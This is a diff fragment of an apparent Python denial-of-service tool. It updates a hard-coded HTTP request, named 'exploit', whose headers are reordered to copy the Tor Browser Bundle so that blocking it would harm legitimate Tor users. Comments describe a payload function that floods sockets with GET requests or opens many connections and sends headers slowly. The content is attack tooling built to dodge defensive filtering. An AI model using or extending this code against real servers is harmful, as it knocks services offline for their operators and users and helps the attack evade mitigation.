@@ -31,11 +31,12 @@ except e as Exception:
     
 exploit = ("GET / HTTP/1.1\r\n"
            "Host: %s\r\n"
-           "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+           "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.5\r\n"
-           "Accept-Encoding: gzip, deflate\r\n"
-           "Connection: keep-alive\r\n\r\n"
+           "Connection: keep-alive\r\n"
+           "Upgrade-Insecure-Requests: 1\r\n"
+           "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
            % (args.s)) #Exact replica of the HTTP request sent by the Tor Browser Bundle, filtering this request will be DoS in itself.
 
 def payload(s, exploit): #floods the open socket with GET requests till it closes (if ever), or opens as many sockets as possible and slowly sends the HTTP headers.
